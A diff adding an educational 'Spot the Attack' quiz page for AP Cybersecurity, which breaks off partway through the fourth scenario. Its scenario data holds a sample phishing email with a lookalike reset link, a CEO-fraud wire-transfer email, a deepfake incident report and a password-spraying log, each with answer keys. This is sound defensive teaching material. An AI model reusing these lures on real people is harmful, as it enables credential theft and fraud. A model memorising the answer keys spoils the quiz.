@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spot the Attack &mdash; AP Cybersecurity</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap" rel="stylesheet">
+<style>
+:root{
+  --navy:#0b1628;--navy-mid:#132040;--navy-light:#1e2e52;
+  --cyan:#00d4c8;--cyan-dim:#00a89f;--amber:#f5a623;
+  --green:#00c864;--red:#ff5555;--white:#f2f5fb;
+  --muted:#8899bb;--card-bg:#111e38;--border:rgba(0,212,200,.15);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'DM Sans',sans-serif;background:var(--navy);color:var(--white);line-height:1.6;overflow-x:hidden;min-height:100vh}
+
+nav{position:sticky;top:0;z-index:200;background:rgba(11,22,40,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 clamp(1rem,3vw,2rem);height:64px;display:flex;align-items:center;justify-content:space-between;gap:1rem}
+.nav-brand{display:flex;align-items:center;gap:.75rem;text-decoration:none;flex-shrink:0}
+.nav-logo{width:36px;height:36px;background:var(--cyan);border-radius:8px;display:grid;place-items:center}
+.nav-logo svg{width:20px;height:20px}
+.nav-title{font-family:'DM Serif Display',serif;font-size:1.05rem;color:var(--white)}
+.nav-title span{color:var(--cyan)}
+.nav-links{display:flex;align-items:center;gap:.2rem;list-style:none}
+.nav-links a{color:var(--muted);text-decoration:none;font-size:.78rem;font-weight:500;padding:.3rem .6rem;border-radius:6px;transition:color .2s,background .2s}
+.nav-links a:hover{color:var(--white);background:rgba(255,255,255,.06)}
+.nav-links a.active{color:var(--cyan)}
+.nav-cta{background:var(--cyan)!important;color:var(--navy)!important;font-weight:600!important}
+@media(max-width:760px){.nav-links{display:none}}
+
+.screen{display:none}.screen.active{display:block}
+
+/* ── SETUP ─────────────────────────────── */
+.setup-wrap{max-width:840px;margin:0 auto;padding:clamp(2.5rem,6vw,4.5rem) clamp(1.5rem,4vw,2rem)}
+.badge{display:inline-flex;align-items:center;gap:.5rem;background:rgba(245,166,35,.1);border:1px solid rgba(245,166,35,.3);color:var(--amber);font-size:.78rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:.35rem .9rem;border-radius:100px;margin-bottom:1.5rem}
+.badge::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--amber);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
+.page-h1{font-family:'DM Serif Display',serif;font-size:clamp(2rem,5vw,3rem);line-height:1.1;letter-spacing:-.02em;margin-bottom:.75rem}
+.page-h1 em{font-style:italic;color:var(--cyan)}
+.page-sub{font-size:1rem;color:var(--muted);max-width:560px;line-height:1.75;margin-bottom:2.5rem;font-weight:300}
+
+.config-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;margin-bottom:1.75rem}
+@media(max-width:580px){.config-grid{grid-template-columns:1fr}}
+.config-card{background:var(--card-bg);border:1px solid var(--border);border-radius:14px;padding:1.3rem}
+.config-label{font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--cyan);margin-bottom:.85rem;display:flex;align-items:center;gap:.4rem}
+.config-label::before{content:'';width:16px;height:2px;background:var(--cyan)}
+
+.type-grid{display:grid;grid-template-columns:1fr 1fr;gap:.45rem}
+@media(max-width:400px){.type-grid{grid-template-columns:1fr}}
+.type-opt{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:9px;padding:.6rem .75rem;cursor:pointer;transition:all .18s;display:flex;flex-direction:column;gap:.15rem}
+.type-opt:hover{border-color:rgba(245,166,35,.35);background:rgba(245,166,35,.06)}
+.type-opt.selected{border-color:var(--amber);background:rgba(245,166,35,.1)}
+.type-opt .type-label{font-size:.83rem;font-weight:600;color:var(--white)}
+.type-opt .type-desc{font-size:.72rem;color:var(--muted);line-height:1.4}
+
+.unit-list{display:flex;flex-direction:column;gap:.4rem}
+.unit-opt{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:9px;padding:.55rem .85rem;cursor:pointer;font-size:.83rem;color:var(--muted);transition:all .18s;display:flex;align-items:center;gap:.6rem}
+.unit-opt:hover{border-color:rgba(0,212,200,.3);color:var(--white)}
+.unit-opt.selected{border-color:var(--cyan);background:rgba(0,212,200,.1);color:var(--white)}
+.unit-dot{width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex-shrink:0;display:grid;place-items:center;transition:all .18s}
+.unit-opt.selected .unit-dot{border-color:var(--cyan);background:var(--cyan)}
+.unit-opt.selected .unit-dot::after{content:'';width:5px;height:5px;border-radius:50%;background:var(--navy)}
+
+.difficulty-row{display:flex;gap:.5rem}
+.diff-btn{flex:1;padding:.6rem .4rem;border-radius:9px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.04);color:var(--muted);font-family:inherit;font-size:.8rem;font-weight:600;cursor:pointer;transition:all .18s;text-align:center}
+.diff-btn:hover{border-color:rgba(0,212,200,.3);color:var(--white)}
+.diff-btn.selected{border-color:var(--cyan);background:rgba(0,212,200,.1);color:var(--cyan)}
+
+.generate-btn{display:flex;align-items:center;justify-content:center;gap:.6rem;width:100%;background:var(--amber);color:var(--navy);font-family:inherit;font-size:1rem;font-weight:700;padding:1rem 2rem;border-radius:12px;border:none;cursor:pointer;transition:transform .2s,opacity .2s}
+.generate-btn:hover{transform:translateY(-2px);opacity:.9}
+.generate-btn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.generate-btn svg{width:18px;height:18px}
+
+/* ── LOADING ────────────────────────────── */
+.loading-wrap{max-width:480px;margin:0 auto;padding:clamp(5rem,12vw,8rem) 2rem;text-align:center}
+.loading-spinner{width:52px;height:52px;border:3px solid rgba(245,166,35,.2);border-top-color:var(--amber);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 1.5rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-h{font-family:'DM Serif Display',serif;font-size:1.5rem;margin-bottom:.5rem}
+.loading-sub{color:var(--muted);font-size:.88rem;line-height:1.65}
+.loading-type{color:var(--amber);font-weight:600}
+
+/* ── SCENARIO SCREEN ────────────────────── */
+.scenario-wrap{max-width:860px;margin:0 auto;padding:clamp(1.5rem,4vw,2.5rem) clamp(1.5rem,4vw,2rem)}
+
+/* scenario doc */
+.doc-card{background:var(--card-bg);border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:2rem}
+.doc-header{background:var(--navy-mid);border-bottom:1px solid var(--border);padding:.85rem 1.25rem;display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap}
+.doc-type-badge{display:flex;align-items:center;gap:.5rem;font-size:.75rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--amber)}
+.doc-type-badge svg{width:15px;height:15px;stroke:var(--amber)}
+.doc-meta{font-size:.75rem;color:var(--muted)}
+.doc-body{padding:1.5rem}
+.doc-subject{font-size:.78rem;color:var(--muted);margin-bottom:.5rem;display:flex;gap:.5rem;flex-wrap:wrap}
+.doc-subject span{font-weight:600;color:var(--white)}
+.doc-text{font-size:.92rem;line-height:1.85;color:var(--white);white-space:pre-wrap;font-family:'DM Sans',sans-serif}
+.doc-text.log-font{font-family:monospace;font-size:.82rem;line-height:1.7;background:rgba(0,0,0,.3);border-radius:8px;padding:1rem;border:1px solid rgba(255,255,255,.07);color:#a8d8a8}
+
+/* questions */
+.questions-area{display:flex;flex-direction:column;gap:1.5rem;margin-bottom:2rem}
+.question-block{background:var(--card-bg);border:1px solid var(--border);border-radius:14px;padding:1.3rem}
+.q-num{font-size:.7rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--cyan);margin-bottom:.4rem;display:flex;align-items:center;gap:.4rem}
+.q-num::before{content:'';width:14px;height:2px;background:var(--cyan)}
+.q-text{font-size:.92rem;font-weight:600;margin-bottom:.85rem;line-height:1.5}
+.options-grid{display:flex;flex-direction:column;gap:.4rem}
+.opt{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:9px;padding:.6rem .9rem;cursor:pointer;font-size:.83rem;color:var(--muted);transition:all .18s;display:flex;align-items:flex-start;gap:.6rem;text-align:left;font-family:inherit;width:100%}
+.opt:hover:not(:disabled){border-color:rgba(245,166,35,.4);color:var(--white);background:rgba(245,166,35,.06)}
+.opt.selected{border-color:var(--amber);background:rgba(245,166,35,.1);color:var(--white)}
+.opt:disabled{cursor:default}
+.opt-dot{width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex-shrink:0;margin-top:1px;transition:all .18s}
+.opt.selected .opt-dot{border-color:var(--amber);background:var(--amber)}
+.opt-text{flex:1;line-height:1.45}
+
+/* submit */
+.submit-row{display:flex;gap:.75rem;align-items:center;flex-wrap:wrap}
+.submit-btn{display:flex;align-items:center;gap:.5rem;background:var(--cyan);color:var(--navy);font-family:inherit;font-size:.95rem;font-weight:700;padding:.85rem 1.8rem;border-radius:11px;border:none;cursor:pointer;transition:transform .2s,opacity .2s}
+.submit-btn:hover{transform:translateY(-2px);opacity:.9}
+.submit-btn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.progress-note{font-size:.8rem;color:var(--muted)}
+
+/* ── RESULTS OVERLAY ────────────────────── */
+.results-overlay{position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(6px);z-index:300;display:none;place-items:start center;padding:1rem;overflow-y:auto}
+.results-overlay.active{display:grid}
+.results-box{background:var(--navy-mid);border:1px solid var(--border);border-radius:20px;max-width:800px;width:100%;margin:auto;animation:fadeUp .35s ease both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+
+.rb-header{padding:1.75rem 1.75rem 0}
+.rb-score-row{display:flex;align-items:center;gap:1.25rem;margin-bottom:.75rem;flex-wrap:wrap}
+.rb-orb{width:76px;height:76px;border-radius:50%;border:3px solid;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0}
+.orb-pct{font-family:'DM Serif Display',serif;font-size:1.4rem;line-height:1}
+.orb-lbl{font-size:.68rem;color:var(--muted)}
+.rb-grade{font-family:'DM Serif Display',serif;font-size:1.4rem;margin-bottom:.25rem}
+.rb-summary{font-size:.87rem;color:var(--muted);line-height:1.7}
+
+.rb-body{padding:1.25rem 1.75rem 1.75rem;display:flex;flex-direction:column;gap:1.25rem}
+
+/* per-question result */
+.q-result{border-radius:12px;padding:1rem 1.1rem;border:1px solid}
+.q-result.correct{background:rgba(0,200,100,.05);border-color:rgba(0,200,100,.25)}
+.q-result.wrong{background:rgba(255,85,85,.05);border-color:rgba(255,85,85,.25)}
+.qr-top{display:flex;align-items:flex-start;gap:.75rem;margin-bottom:.5rem}
+.qr-icon{width:22px;height:22px;border-radius:6px;display:grid;place-items:center;flex-shrink:0}
+.qr-icon svg{width:12px;height:12px}
+.qr-icon.ci{background:rgba(0,200,100,.15)}.qr-icon.ci svg{stroke:var(--green)}
+.qr-icon.wi{background:rgba(255,85,85,.15)}.qr-icon.wi svg{stroke:var(--red)}
+.qr-q{font-weight:600;font-size:.85rem;flex:1}
+.qr-answers{margin-left:2rem;margin-bottom:.5rem;display:flex;flex-direction:column;gap:.2rem;font-size:.8rem}
+.qr-student{color:var(--muted)}
+.qr-student .wrong-val{color:var(--red)}
+.qr-student .correct-val{color:var(--green)}
+.qr-correct{color:var(--cyan)}
+.qr-explanation{font-size:.81rem;color:var(--muted);line-height:1.65;margin-left:2rem;padding-top:.4rem;border-top:1px solid rgba(255,255,255,.06)}
+
+.rb-actions{display:flex;gap:.75rem;flex-wrap:wrap}
+.rb-btn{flex:1;min-width:140px;display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.85rem;border-radius:10px;font-family:inherit;font-size:.88rem;font-weight:600;cursor:pointer;border:none;transition:transform .18s,opacity .18s}
+.rb-btn:hover{transform:translateY(-1px);opacity:.9}
+.rb-btn.primary{background:var(--amber);color:var(--navy)}
+.rb-btn.secondary{background:rgba(255,255,255,.07);color:var(--white);border:1px solid rgba(255,255,255,.12)}
+.rb-btn svg{width:15px;height:15px}
+
+/* streak tracker */
+.streak-bar{display:flex;align-items:center;gap:.65rem;background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:.65rem 1.1rem;margin-bottom:1.5rem}
+.streak-label{font-size:.75rem;color:var(--muted);font-weight:500}
+.streak-dots{display:flex;gap:.3rem}
+.streak-dot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,.1);transition:background .3s}
+.streak-dot.hit{background:var(--amber)}
+.streak-score{margin-left:auto;font-size:.8rem;font-weight:700;color:var(--cyan)}
+
+/* Dropdown nav */
+.nav-dropdown{position:relative}
+.nav-dropdown-btn{color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;padding:.35rem .65rem;border-radius:6px;transition:color .2s,background .2s;background:none;border:none;font-family:inherit;cursor:pointer;display:flex;align-items:center;gap:.3rem}
+.nav-dropdown-btn:hover{color:var(--white);background:rgba(255,255,255,.06)}
+.nav-dropdown-btn.has-active{color:var(--cyan)}
+.nav-dropdown-btn svg{width:11px;height:11px;transition:transform .2s}
+.nav-dropdown:hover .nav-dropdown-btn svg{transform:rotate(180deg)}
+.nav-dropdown-menu{position:absolute;top:calc(100% + 8px);right:0;background:var(--navy-mid);border:1px solid var(--border);border-radius:12px;padding:.4rem;min-width:180px;opacity:0;visibility:hidden;transform:translateY(-6px);transition:all .2s;z-index:300;box-shadow:0 12px 40px rgba(0,0,0,.5)}
+.nav-dropdown:hover .nav-dropdown-menu{opacity:1;visibility:visible;transform:translateY(0)}
+.nav-dropdown-menu a{display:block;color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;padding:.45rem .75rem;border-radius:7px;transition:color .15s,background .15s;white-space:nowrap}
+.nav-dropdown-menu a:hover{color:var(--white);background:rgba(255,255,255,.06)}
+.nav-dropdown-menu a.active{color:var(--cyan)}
+.nav-dropdown-menu .menu-divider{height:1px;background:var(--border);margin:.3rem .4rem}
+
+.nav-hamburger{display:none;flex-direction:column;justify-content:center;gap:5px;background:none;border:none;cursor:pointer;padding:.4rem;width:36px;height:36px;flex-shrink:0}
+.nav-hamburger span{display:block;height:2px;width:22px;background:var(--white);border-radius:2px;transition:all .25s}
+@media(max-width:900px){.nav-hamburger{display:flex}.nav-links{display:none!important}}
+.mobile-nav-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);z-index:490;opacity:0;visibility:hidden;transition:opacity .25s,visibility .25s}
+.mobile-nav-backdrop.open{opacity:1;visibility:visible}
+.mobile-nav-drawer{position:fixed;top:0;right:0;bottom:0;width:min(320px,88vw);background:var(--navy-mid);border-left:1px solid var(--border);z-index:500;transform:translateX(100%);transition:transform .3s cubic-bezier(.4,0,.2,1);overflow-y:auto;display:flex;flex-direction:column}
+.mobile-nav-drawer.open{transform:translateX(0)}
+.mobile-nav-header{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;border-bottom:1px solid var(--border);height:64px;flex-shrink:0}
+.mobile-nav-title{font-family:'DM Serif Display',serif;font-size:1.05rem;color:var(--white)}
+.mobile-nav-close{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);color:var(--white);width:32px;height:32px;border-radius:7px;font-size:1.2rem;cursor:pointer;display:grid;place-items:center;line-height:1;transition:background .18s}
+.mobile-nav-close:hover{background:rgba(255,255,255,.14)}
+.mobile-nav-links{padding:.75rem;display:flex;flex-direction:column;gap:.2rem;flex:1}
+.mobile-nav-links a{display:block;color:var(--muted);text-decoration:none;font-size:.92rem;font-weight:500;padding:.7rem .9rem;border-radius:9px;transition:color .18s,background .18s}
+.mobile-nav-links a:hover{color:var(--white);background:rgba(255,255,255,.06)}
+.mobile-nav-links a.active{color:var(--cyan);background:rgba(0,212,200,.07)}
+.mobile-nav-links a.nav-cta{background:var(--cyan);color:var(--navy);font-weight:700;margin-top:.5rem;text-align:center}
+.mobile-nav-links a.nav-cta:hover{opacity:.9}
+.mobile-nav-section-label{font-size:.68rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);padding:.65rem .9rem .3rem;opacity:.7}
+.mobile-nav-divider{height:1px;background:rgba(255,255,255,.07);margin:.4rem .5rem}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="index.html" class="nav-brand"><div class="nav-logo"><svg viewBox="0 0 24 24" fill="none" stroke="#0b1628" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="nav-title">AP <span>Cybersecurity</span></span></a>
+  <ul class="nav-links">
+    <li><a href="index.html">Home</a></li>
+    <li><a href="socratic-anchors.html">Socratic Guides</a></li>
+    <li><a href="tools.html" class="active">Student Tools</a></li>
+    <li><a href="legal.html">Legal</a></li>
+    <li><a href="edtech-tool.html">EdTech Privacy</a></li>
+    <li><a href="https://apcentral.collegeboard.org" target="_blank" class="nav-cta">AP Central &#x2197;</a></li>
+  </ul>
+  <button class="nav-hamburger" id="nav-hamburger" onclick="toggleMobileNav()" aria-label="Open menu">
+    <span></span><span></span><span></span>
+  </button>
+</nav>
+<div class="mobile-nav-backdrop" id="mobile-nav-backdrop" onclick="closeMobileNav()"></div>
+<div class="mobile-nav-drawer" id="mobile-nav-drawer">
+  <div class="mobile-nav-header">
+    <span class="mobile-nav-title">AP <span style="color:var(--cyan)">Cybersecurity</span></span>
+    <button class="mobile-nav-close" onclick="closeMobileNav()">&times;</button>
+  </div>
+  <div class="mobile-nav-links">
+    <a href="index.html" onclick="closeMobileNav()">Home</a>
+    <a href="socratic-anchors.html" onclick="closeMobileNav()">Socratic Guides</a>
+    <a href="tools.html" class="active" onclick="closeMobileNav()">Student Tools</a>
+    <a href="edtech-tool.html" onclick="closeMobileNav()">EdTech Privacy</a>
+    <a href="https://apcentral.collegeboard.org" target="_blank" class="nav-cta" onclick="closeMobileNav()">AP Central &#x2197;</a>
+  </div>
+</div>
+
+
+<!-- SETUP -->
+<div id="screen-setup" class="screen active">
+  <div class="setup-wrap">
+    <div class="badge">AP Applied Reading &middot; AI-Generated</div>
+    <h1 class="page-h1">Spot the<br><em>Attack</em></h1>
+    <p class="page-sub">Read a realistic email, log, or incident report, then identify the attack technique, adversary type, most relevant AP topic, and best countermeasure. Trains exactly the applied reading comprehension the AP exam favors.</p>
+
+    <div class="config-grid">
+      <div class="config-card" style="grid-column:span 2">
+        <div class="config-label">Scenario Type</div>
+        <div class="type-grid" id="type-grid"></div>
+      </div>
+
+      <div class="config-card">
+        <div class="config-label">Focus Unit</div>
+        <div class="unit-list" id="unit-list"></div>
+      </div>
+
+      <div class="config-card">
+        <div class="config-label">Difficulty</div>
+        <div class="difficulty-row" id="diff-row">
+          <button class="diff-btn" data-d="Standard" onclick="selectDiff(this)">Standard</button>
+          <button class="diff-btn" data-d="Advanced" onclick="selectDiff(this)">Advanced</button>
+          <button class="diff-btn" data-d="Expert" onclick="selectDiff(this)">Expert</button>
+        </div>
+        <p style="font-size:.75rem;color:var(--muted);margin-top:.85rem;line-height:1.55" id="diff-desc">Select a difficulty level above.</p>
+      </div>
+    </div>
+
+    <button class="generate-btn" id="gen-btn" onclick="generateScenario()" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      Generate Scenario
+    </button>
+  </div>
+</div>
+
+<!-- LOADING -->
+
+
+<!-- SCENARIO -->
+<div id="screen-scenario" class="screen">
+  <div class="scenario-wrap">
+
+    <div class="streak-bar">
+      <div class="streak-label">Session</div>
+      <div class="streak-dots" id="streak-dots"></div>
+      <div class="streak-score" id="streak-score">0 correct</div>
+    </div>
+
+    <div class="doc-card">
+      <div class="doc-header">
+        <div class="doc-type-badge" id="doc-type-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+          <span id="doc-type-label">Email</span>
+        </div>
+        <div class="doc-meta" id="doc-meta"></div>
+      </div>
+      <div class="doc-body">
+        <div class="doc-subject" id="doc-subject" style="display:none"></div>
+        <div class="doc-text" id="doc-text"></div>
+      </div>
+    </div>
+
+    <div class="questions-area" id="questions-area"></div>
+
+    <div class="submit-row">
+      <button class="submit-btn" id="submit-btn" onclick="submitAnswers()" disabled>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+        Analyze My Answers
+      </button>
+      <div class="progress-note" id="progress-note">Select all 4 answers to submit</div>
+    </div>
+  </div>
+</div>
+
+<!-- RESULTS OVERLAY -->
+<div class="results-overlay" id="results-overlay">
+  <div class="results-box">
+    <div class="rb-header">
+      <div class="rb-score-row" id="rb-score-row"></div>
+      <div class="rb-summary" id="rb-summary"></div>
+    </div>
+    <div class="rb-body" id="rb-body"></div>
+    <div style="padding:0 1.75rem 1.75rem">
+      <div class="rb-actions">
+        <button class="rb-btn primary" onclick="nextScenario()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          Next Scenario
+        </button>
+        <button class="rb-btn secondary" onclick="closeResults()">Revise Answers</button>
+        <button class="rb-btn secondary" onclick="goSetup()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+          New Settings
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+var SPOT_SCENARIOS = 
+[
+  {
+    "unit": "1",
+    "type": "email",
+    "difficulty": "beginner",
+    "doc_type": "email",
+    "doc_meta": "Received: Tuesday 08:14 | Inbox: Sarah Chen, HR Coordinator",
+    "doc_subject": [
+      {
+        "label": "From",
+        "value": "IT-Support@meridian-corp.net"
+      },
+      {
+        "label": "Subject",
+        "value": "Urgent: Reset Your Password Now"
+      }
+    ],
+    "doc_text": "Dear Sarah,\n\nOur security team has detected unusual login attempts on your account. To protect your data, you must reset your password within 2 hours or your account will be locked.\n\nClick here to reset: http://meridian-corp-secure.net/reset\n\nDo not share this link. If you did not request this, call the Help Desk immediately.\n\nRegards,\nIT Security Team",
+    "overall_explanation": "This is a classic phishing email using urgency, fear, and a lookalike domain. The domain 'meridian-corp-secure.net' differs from the real company domain. Security awareness training is the primary defense because users need to recognize these social engineering tactics.",
+    "questions": [
+      {
+        "q": "What attack technique is this email demonstrating?",
+        "correct_answer": "Phishing / Spear-Phishing",
+        "explanation": "The email uses a fake sender address, urgent language, and a lookalike domain link to trick the user into clicking. This is a textbook phishing attempt designed to harvest credentials."
+      },
+      {
+        "q": "Who most likely sent this email?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Mass credential-harvesting phishing campaigns are most commonly run by transnational criminal organizations seeking financial gain through stolen account access or resale of credentials."
+      },
+      {
+        "q": "Which AP Cybersecurity topic does this scenario best illustrate?",
+        "correct_answer": "Topic 1.1 \u2014 Social Engineering",
+        "explanation": "Phishing is the most common form of social engineering. Topic 1.1 covers how attackers manipulate human psychology using urgency, authority, and fear rather than technical exploits."
+      },
+      {
+        "q": "What is the most effective countermeasure against this type of attack?",
+        "correct_answer": "Security Awareness Training",
+        "explanation": "Security awareness training teaches users to recognize phishing indicators such as lookalike domains, urgency pressure, and unsolicited password reset requests before they click."
+      }
+    ]
+  },
+  {
+    "unit": "1",
+    "type": "email",
+    "difficulty": "intermediate",
+    "doc_type": "email",
+    "doc_meta": "Received: Thursday 11:52 | Inbox: David Park, CFO",
+    "doc_subject": [
+      {
+        "label": "From",
+        "value": "james.whitfield@meridian-capital.co"
+      },
+      {
+        "label": "Subject",
+        "value": "Wire Transfer Authorization \u2014 Q3 Settlement"
+      }
+    ],
+    "doc_text": "David,\n\nI am traveling and need you to process an urgent wire transfer of $187,500 to our Singapore settlement account before the close of business today. This is time-sensitive \u2014 our legal team has confirmed the transfer must clear by 5 PM.\n\nAccount: 4821-887-009\nBank: Pacific Rim Finance, Singapore\nReference: Q3-SETTLE-2026\n\nDo not call me \u2014 I am in back-to-back meetings. Send me a quick email confirmation once it is done.\n\nJames Whitfield\nCEO, Meridian Capital",
+    "overall_explanation": "This is a Business Email Compromise (BEC) spear-phishing attack, also known as CEO fraud. The attacker spoofs or hijacks an executive email address and uses authority, urgency, and a 'do not call' instruction to prevent verification. MFA on email accounts is the strongest technical control.",
+    "questions": [
+      {
+        "q": "What attack technique does this email represent?",
+        "correct_answer": "Phishing / Spear-Phishing",
+        "explanation": "This is spear-phishing specifically targeting the CFO using the CEO's identity. The personalized targeting, financial urgency, and instruction not to verify by phone are hallmarks of a Business Email Compromise spear-phishing attack."
+      },
+      {
+        "q": "What adversary profile best fits this attack?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "BEC fraud is primarily conducted by organized transnational criminal groups, particularly from West Africa and Eastern Europe. The financial motive and sophisticated social engineering match this profile."
+      },
+      {
+        "q": "Which AP topic area does this scenario address?",
+        "correct_answer": "Topic 1.1 \u2014 Social Engineering",
+        "explanation": "BEC attacks exploit authority, urgency, and trust rather than technical vulnerabilities. Topic 1.1 covers how adversaries manipulate human decision-making to bypass security controls."
+      },
+      {
+        "q": "What countermeasure would most directly prevent this attack from succeeding?",
+        "correct_answer": "MFA (Multifactor Authentication)",
+        "explanation": "MFA on email accounts prevents attackers from accessing and sending emails from compromised executive accounts, and a secondary verification policy for wire transfers stops the financial loss even if the email is convincing."
+      }
+    ]
+  },
+  {
+    "unit": "1",
+    "type": "incident",
+    "difficulty": "advanced",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0441 | Analyst: K. Torres | Status: Closed",
+    "doc_subject": [
+      {
+        "label": "Org",
+        "value": "Hargrove University"
+      },
+      {
+        "label": "Date",
+        "value": "March 15, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nAt 09:22, a faculty member reported receiving a video message from the Dean of Academic Affairs requesting immediate submission of all student grade files to an external Dropbox link. The faculty member noticed the Dean's lip movements appeared slightly delayed from the audio. IT Security confirmed the Dean sent no such message. The video was traced to a link distributed via the university's Microsoft Teams channel.\n\nThe external link collected credentials from three faculty members who complied before the alert was issued. No grade data was exfiltrated as the Dropbox account was taken down within two hours.\n\nRoot cause: No verification protocol existed for unusual data requests from leadership.",
+    "overall_explanation": "This is a deepfake-based social engineering attack using AI-generated video to impersonate a university executive. The delayed lip sync was the visual tell. The attack exploited the absence of an out-of-band verification process. Topic 1.4 covers AI-based attacks including deepfakes used for fraud and social engineering.",
+    "questions": [
+      {
+        "q": "What attack technique does this incident describe?",
+        "correct_answer": "Deepfake / AI Impersonation",
+        "explanation": "The attacker used AI-generated video of the Dean to request sensitive data. The delayed lip sync artifact is a characteristic indicator of deepfake video content produced with imperfect face-swap synthesis."
+      },
+      {
+        "q": "What type of adversary most likely conducted this attack?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "AI-generated deepfake attacks targeting universities for credential theft are most consistent with organized criminal groups that have access to deepfake tools and monetize stolen credentials."
+      },
+      {
+        "q": "Which AP Cybersecurity topic does this scenario best illustrate?",
+        "correct_answer": "Topic 1.4 \u2014 AI-Based Attacks",
+        "explanation": "Topic 1.4 specifically covers how AI tools are used to create convincing fake audio and video for fraud and social engineering. This deepfake video of the Dean is a direct application of AI-based attack techniques."
+      },
+      {
+        "q": "What countermeasure would best prevent this type of attack?",
+        "correct_answer": "Security Awareness Training",
+        "explanation": "Training faculty to recognize deepfake artifacts (lip sync delays, unnatural blinking, audio artifacts) and to verify unusual data requests through a secondary channel (phone call to a known number) is the most effective defense."
+      }
+    ]
+  },
+  {
+    "unit": "1",
+    "type": "log",
+    "difficulty": "intermediate",
+    "doc_type": "log",
+    "doc_meta": "Source: Active Directory Security Log | Timeframe: 2026-03-18 02:00\u201302:47",
+    "doc_subject": [
+      {
+        "label": "Host",
+        "value": "ADFS-SERVER-01"
+      },
+      {
+        "label": "Event IDs",
+        "value": "4625 (failed logon)"
+      }
+    ],
+    "doc_text": "02:00:14  FAIL  user: admin@corp.local     src: 185.220.101.47\n02:00:19  FAIL  user: administrator@corp     src: 185.220.101.47\n02:00:24  FAIL  user: svc_backup@corp.local   src: 185.220.101.47\n02:00:29  FAIL  user: helpdesk@corp.local     src: 185.220.101.47\n02:00:34  FAIL  user: finance@corp.local      src: 185.220.101.47\n02:00:39  FAIL  user: sarah.chen@corp.local   src: 185.220.101.47\n...\n[Pattern repeats across 847 accounts with password: Summer2026!]\n02:47:03  PASS  user: j.warren@corp.local     src: 185.220.101.47",
+    "overall_explanation": "This log shows password spraying: one common password tried across hundreds of accounts. Unlike brute force (many passwords against one account), spraying avoids lockout thresholds. The single successful login at 02:47 confirms compromise. SIEM correlation and MFA are the key defenses.",
+    "questions": [
+      {
+        "q": "What attack technique does this log excerpt show?",
+        "correct_answer": "Password Spraying",
+        "explanation": "The log shows a single password (Summer2026!) being tried against 847 different accounts from the same source IP. This is password spraying, which avoids account lockout by staying under the failed-attempt threshold per account."
